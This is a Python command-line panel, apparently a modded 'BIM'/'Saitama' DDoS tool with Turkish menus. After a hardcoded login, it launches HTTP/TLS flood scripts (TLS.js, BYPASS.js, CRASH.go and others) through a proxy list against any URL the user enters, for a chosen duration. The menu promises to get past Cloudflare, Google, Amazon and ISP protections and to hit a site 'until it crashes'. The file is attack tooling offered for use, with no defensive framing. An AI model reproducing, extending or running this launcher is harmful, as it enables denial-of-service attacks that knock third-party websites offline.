import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA V2 | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white, ''' 
██████╗ ██╗███╗   ███╗
██╔══██╝██║████╗ ████║
███████ ██║██╔████╔██║
██║  ██ ██║██║╚██╔╝██║
██████╗ ██║██║ ╚═╝ ██║   
 ╚═════╝╚═╝╚═╝     ╚═╝  
version.2.0.1

            Make By TEAM BD AND MODDED BY imscruz 
        
                Layer7 Listesi
          
            
!TLS - GUCLU TLS YONTEMIYLE AMAZON, GOOGLE, CF VE ISS'LERI ATLAT  
!BYPASS - YUKSEK RPS ILE HERHANGI BIR ISS'I ATLAT  
!HTTPS - HTTPS-FLOOD ILE SALDIRI GONDER  
!RAPID - HTTP DDOS ICIN YUKSEK RPS GONDER  
!BLACK - SITEYI COKENE KADAR HEDEFLE  
!CRASH - DUSUK KALITELI SITEYE SALDIR  


Nasıl KULLANILIR
TLS https://example.com 120  TLS URL ZAMAN
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white
   , "WELCOME TO BIM PANEL | USER: imscruz| PLAN :: VIP | Proxy: " + bots_str + " | IYICE KULLANIN!"))
    print("")
    banner = '''
██████╗ ██╗███╗   ███╗
██╔══██╝██║████╗ ████║
███████ ██║██╔████╔██║
██║  ██ ██║██║╚██╔╝██║
██████╗ ██║██║ ╚═╝ ██║   
 ╚═════╝╚═╝╚═╝     ╚═╝ 
version.2.0.1

Make By TEAM BD AND MODDED BY imscruz 

Yontemler icin Layer7 yada Layer4 yazınız.⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "imscruz@BIM#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TLS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.tx')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - TUM LAYER7 METHODLARINI GORMENIZI SAGLAR
HELP - YARDIM ICIN
CLEAR - TERMINALI TEMIZLER
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "imscruz"
    passwd = "sexsex"
    username = input("</> Kullanıcı Adı: ")
    password = getpass.getpass(prompt='</> Sifre: ')
    if username != user or password != passwd:
        print("")
        print("Bilmiyomusun? xd??")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("BIM e hosgeldiniz!")
        time.sleep(0.3)
        main()
login()
